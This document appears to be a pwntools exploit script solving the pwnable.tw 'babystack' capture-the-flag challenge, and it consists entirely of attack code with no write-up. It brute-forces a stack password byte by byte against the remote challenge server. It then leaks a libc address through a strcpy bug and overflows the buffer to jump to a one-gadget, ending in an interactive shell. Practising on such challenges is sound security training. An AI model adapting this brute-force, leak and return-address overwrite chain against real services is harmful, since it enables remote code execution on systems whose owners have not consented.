#!/usr/bin/python3
from pwn import *

exe = process(["./babystack_patched"])

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript = '''
    b* main+35
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# p = exe
p = remote("chall.pwnable.tw",10205)
context.log_level = 'DEBUG'
# gdb.attach(p)
currentstack = b""
lol = []
i=0
# part 1 passkey bruteforce
for j in range (24):
    x = "Failure"
    while((x != b"Login Success !" and i<=255 )):
        p.recvuntil(">> ")
        p.sendline("1")
        p.recvuntil("passowrd :")
        l=[]
        i=(i+1)%256
        l.append(i)
        p.sendline(currentstack + bytes(l))
        print("i -->",l)
        x = p.recvline().strip()
        print("{",x,"}")
    else:
        print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH")
        p.recvuntil(">> ")
        p.sendline("1")
        lol.append(i-1)
        currentstack = currentstack + bytes(l)
        print(lol)
    i=0

print("The stack password looks like this :--->",currentstack)
password = currentstack[:-4:]
#part 1 stops with the initial condition
#part 2 leaking libc using a strcpy vulnerability

libraryc = b"qqqqqqqq"
p.recvuntil(b">> ")
p.sendline(b"1")
p.recvuntil("passowrd :")
p.send(b"\x00"+ 71*b"q")
p.recvuntil(b">> ")
p.sendline("3")
p.recvuntil("Copy :")
p.send(63*b"a")
p.recvuntil(b">> ")
p.sendline("1")
for j in range (8):
    x = "Failure"
    while((x != b"Login Success !" and i<=255 )):
        p.recvuntil(">> ")
        p.sendline("1")
        p.recvuntil("passowrd :")
        lee=[]
        i=(i+1)%256
        lee.append(i)
        p.sendline(libraryc + bytes(lee))
        print("i -->",lee)
        x = p.recvline().strip()
        print("{",x,"}")
    else:
        print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH")
        p.recvuntil(">> ")
        p.sendline("1")
        libraryc = libraryc + bytes(lee)
        print(libraryc)
    i=0
libraryc = libraryc[:-2:]
libraryc = libraryc[8::]
print(libraryc)
libstd = int.from_bytes(libraryc,byteorder="little")
print(hex(libstd))
# part 3 buffer overflow with the passkey put in place
# one gadget constraint rax = 0
lib = libstd - 0x78439
onegadget = lib + 0x45216
p.recvuntil(">> ")
p.sendline(b"1")
p.recvuntil("passowrd :")
p.sendline(64*b"q" + password + 20*b"q" + p64(onegadget))
p.recvuntil(">> ")
p.sendline("1")
p.recvuntil("passowrd :")
p.sendline("")
p.recvuntil(">> ")
p.sendline("3")
p.recvuntil("Copy :")
p.sendline(63*"q")
p.recvuntil(">> ")
p.sendline(b"2")
print(hex(libstd))
p.interactive()